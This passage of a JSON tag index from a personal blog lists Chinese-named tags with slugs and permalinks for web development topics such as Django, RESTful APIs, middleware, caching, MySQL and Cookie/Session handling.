","permalink":"http://www.xiaocaibi.top/tags/%E4%BD%BF%E7%94%A8%E7%BC%93%E5%AD%98/"},{"name":"RESTful架构和DRF进阶","slug":"RESTful架构和DRF进阶","permalink":"http://www.xiaocaibi.top/tags/RESTful%E6%9E%B6%E6%9E%84%E5%92%8CDRF%E8%BF%9B%E9%98%B6/"},{"name":".RESTful架构","slug":"RESTful架构","permalink":"http://www.xiaocaibi.top/tags/RESTful%E6%9E%B6%E6%9E%84/"},{"name":"前后端分离开发入门","slug":"前后端分离开发入门","permalink":"http://www.xiaocaibi.top/tags/%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/"},{"name":"中间件的应用","slug":"中间件的应用","permalink":"http://www.xiaocaibi.top/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E5%BA%94%E7%94%A8/"},{"name":"日志和调试工具栏","slug":"日志和调试工具栏","permalink":"http://www.xiaocaibi.top/tags/%E6%97%A5%E5%BF%97%E5%92%8C%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7%E6%A0%8F/"},{"name":"制作报表","slug":"制作报表","permalink":"http://www.xiaocaibi.top/tags/%E5%88%B6%E4%BD%9C%E6%8A%A5%E8%A1%A8/"},{"name":"Cookie和Session","slug":"Cookie和Session","permalink":"http://www.xiaocaibi.top/tags/Cookie%E5%92%8CSession/"},{"name":"静态资源和Ajax请求","slug":"静态资源和Ajax请求","permalink":"http://www.xiaocaibi.top/tags/%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E5%92%8CAjax%E8%AF%B7%E6%B1%82/"},{"name":"深入模型","slug":"深入模型","permalink":"http://www.xiaocaibi.top/tags/%E6%B7%B1%E5%85%A5%E6%A8%A1%E5%9E%8B/"},{"name":"Django","slug":"Django","permalink":"http://www.xiaocaibi.top/tags/Django/"},{"name":"Nosql","slug":"Nosql","permalink":"http://www.xiaocaibi.top/tags/Nosql/"},{"name":"Mysql","slug":"Mysql","permalink":"http://www.xiaocaibi.top/tags/Mysql/"},{"name":"web前端","slug":"web前端","permalink":"http://www.xiaocaibi.top/tags/web%E5%89%8D%E7%AB%AF/"},{"name":"思科","slug":"思科","permalink":"http://www.xiaocaibi.top/tags/%E6%80%9D%E7%A7%91/"},{"name":"第一篇","slug":"第一篇","permalink":"http://www.xiaocaibi.top/tags/%E7%AC%AC%E4%B8%80%E7%AF%87/"}]}